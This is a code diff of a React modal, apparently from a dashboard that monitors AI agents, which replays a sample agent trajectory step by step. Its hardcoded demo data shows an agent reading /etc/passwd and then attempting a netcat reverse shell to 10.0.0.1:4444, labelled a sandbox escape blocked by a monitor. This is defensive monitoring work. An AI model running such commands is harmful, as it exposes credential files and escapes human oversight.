@@ -1,7 +1,10 @@
 "use client";
 
-import { useState } from 'react';
-import { ShieldAlert, Play, Pause, RotateCcw, X, AlertTriangle, CheckCircle, Terminal } from 'lucide-react';
+import { useState } from "react";
+import { ShieldAlert, RotateCcw, X } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { RiskScore } from "@/components/shared/RiskScore";
 
 interface AutopsyReplayModalProps {
   isOpen: boolean;
@@ -10,93 +13,72 @@ interface AutopsyReplayModalProps {
 
 export default function AutopsyReplayModal({ isOpen, onClose }: AutopsyReplayModalProps) {
   const [currentStep, setCurrentStep] = useState(0);
-  const [isPlaying, setIsPlaying] = useState(false);
 
   if (!isOpen) return null;
 
   const trajectorySteps = [
-    { turn: 1, action: "Reconnaissance", tool: "list_files", status: "SAFE", risk: 10, detail: "Agent listed /tmp sandbox directory." },
-    { turn: 2, action: "Reconnaissance", tool: "read_config", status: "SAFE", risk: 25, detail: "Agent retrieved non-sensitive app config." },
-    { turn: 3, action: "Privilege Escalation", tool: "cat /etc/passwd", status: "WARNING", risk: 65, detail: "Agent attempted sensitive credential harvest." },
-    { turn: 4, action: "Autonomous Sandbox Escape", tool: "nc -e /bin/sh 10.0.0.1 4444", status: "CRITICAL", risk: 95, detail: "Reverse shell egress attempt BLOCKED by EDS engine." },
+    { turn: 1, action: "Reconnaissance", tool: "list_files", risk: 10, detail: "Agent listed /tmp sandbox directory." },
+    { turn: 2, action: "Reconnaissance", tool: "read_config", risk: 25, detail: "Agent retrieved non-sensitive app config." },
+    { turn: 3, action: "Privilege Escalation", tool: "cat /etc/passwd", risk: 65, detail: "Agent attempted sensitive credential harvest." },
+    { turn: 4, action: "Sandbox Escape", tool: "nc -e /bin/sh 10.0.0.1 4444", risk: 95, detail: "Reverse shell egress attempt BLOCKED by EDS engine." },
   ];
 
+  const step = trajectorySteps[currentStep];
+
   return (
-    <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
-      <div className="bg-soc-surface border border-soc-border rounded-2xl w-full max-w-3xl overflow-hidden shadow-2xl space-y-4 p-6">
-        {/* Modal Header */}
-        <div className="flex items-center justify-between border-b border-soc-border pb-4">
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 p-4 backdrop-blur-md" role="presentation" onClick={onClose}>
+      <div
+        className="w-full max-w-3xl space-y-4 rounded-xl border border-border bg-card p-6 shadow-2xl"
+        role="dialog"
+        aria-modal="true"
+        aria-label="Autopsy replay"
+        onClick={(e) => e.stopPropagation()}
+      >
+        <div className="flex items-center justify-between border-b border-border pb-4">
           <div className="flex items-center gap-3">
-            <div className="p-2 rounded-xl bg-soc-critical/20 text-soc-critical border border-soc-critical/40">
-              <ShieldAlert className="w-5 h-5" />
+            <div className="rounded-lg bg-destructive/15 p-2 text-destructive">
+              <ShieldAlert className="h-5 w-5" aria-hidden />
             </div>
             <div>
-              <h2 className="text-base font-extrabold text-soc-text font-mono flex items-center gap-2">
-                AUTOPSY MODE — Sandbox Escape Trajectory Replay
-              </h2>
-              <p className="text-xs text-soc-muted">
-                Cinematic step-by-step forensic analysis of autonomous agent privilege escalation.
-              </p>
+              <h2 className="font-mono text-base font-bold">Autopsy Mode — Trajectory Replay</h2>
+              <p className="text-xs text-muted-foreground">Step-by-step forensic analysis of agent escalation</p>
             </div>
           </div>
-
-          <button onClick={onClose} className="p-1.5 rounded-lg bg-soc-elevated text-soc-muted hover:text-soc-text transition">
-            <X className="w-5 h-5" />
-          </button>
+          <Button variant="ghost" size="icon" onClick={onClose} aria-label="Close autopsy replay">
+            <X className="h-5 w-5" />
+          </Button>
         </div>
 
-        {/* Step Visualizer */}
-        <div className="space-y-3">
-          <div className="flex items-center justify-between text-xs font-mono text-soc-muted">
-            <span>Trajectory Step: {currentStep + 1} / {trajectorySteps.length}</span>
-            <span className={`px-2 py-0.5 rounded font-bold ${
-              trajectorySteps[currentStep].risk >= 70 ? 'badge-critical' : 'badge-low'
-            }`}>
-              Containment Risk: {trajectorySteps[currentStep].risk} / 100
-            </span>
-          </div>
-
-          {/* Current Step Banner */}
-          <div className="p-4 rounded-xl bg-soc-bg border border-soc-border space-y-2">
-            <div className="flex items-center justify-between">
-              <span className="text-xs font-bold text-soc-accent font-mono uppercase">
-                Turn {trajectorySteps[currentStep].turn}: {trajectorySteps[currentStep].action}
-              </span>
-              <span className="text-xs font-mono font-bold text-soc-critical">
-                Tool: {trajectorySteps[currentStep].tool}
-              </span>
-            </div>
-            <p className="text-xs font-mono text-soc-text bg-soc-surface p-3 rounded-lg border border-soc-border">
-              {trajectorySteps[currentStep].detail}
-            </p>
-          </div>
+        <div className="flex items-center justify-between font-mono text-xs text-muted-foreground">
+          <span>
+            Step {currentStep + 1} / {trajectorySteps.length}
+          </span>
+          <RiskScore score={step.risk} />
         </div>
 
-        {/* Controls */}
-        <div className="flex items-center justify-between pt-2 border-t border-soc-border font-mono text-xs">
-          <div className="flex items-center gap-2">
-            <button
-              onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
-              disabled={currentStep === 0}
-              className="px-3 py-1.5 rounded-lg bg-soc-elevated border border-soc-border text-soc-text disabled:opacity-40"
-            >
+        <div className="space-y-2 rounded-xl border border-border bg-muted/20 p-4">
+          <div className="flex items-center justify-between">
+            <Badge variant="info" className="font-mono text-[10px]">
+              Turn {step.turn}: {step.action}
+            </Badge>
+            <span className="font-mono text-xs font-semibold text-destructive">Tool: {step.tool}</span>
+          </div>
+          <p className="rounded-lg border border-border bg-zinc-950 p-3 font-mono text-xs">{step.detail}</p>
+        </div>
+
+        <div className="flex items-center justify-between border-t border-border pt-2">
+          <div className="flex gap-2">
+            <Button variant="outline" size="sm" disabled={currentStep === 0} onClick={() => setCurrentStep((s) => s - 1)}>
               Previous
-            </button>
-            <button
-              onClick={() => setCurrentStep(Math.min(trajectorySteps.length - 1, currentStep + 1))}
-              disabled={currentStep === trajectorySteps.length - 1}
-              className="px-3 py-1.5 rounded-lg bg-soc-accent text-white font-bold disabled:opacity-40"
-            >
-              Next Step
-            </button>
+            </Button>
+            <Button size="sm" disabled={currentStep === trajectorySteps.length - 1} onClick={() => setCurrentStep((s) => s + 1)}>
+              Next
+            </Button>
           </div>
-
-          <button
-            onClick={() => setCurrentStep(0)}
-            className="px-3 py-1.5 rounded-lg bg-soc-surface border border-soc-border text-soc-muted hover:text-soc-text flex items-center gap-1.5"
-          >
-            <RotateCcw className="w-3.5 h-3.5" /> Restart Replay
-          </button>
+          <Button variant="ghost" size="sm" className="gap-1.5 font-mono text-xs" onClick={() => setCurrentStep(0)}>
+            <RotateCcw className="h-3.5 w-3.5" aria-hidden />
+            Restart
+          </Button>
         </div>
       </div>
     </div>
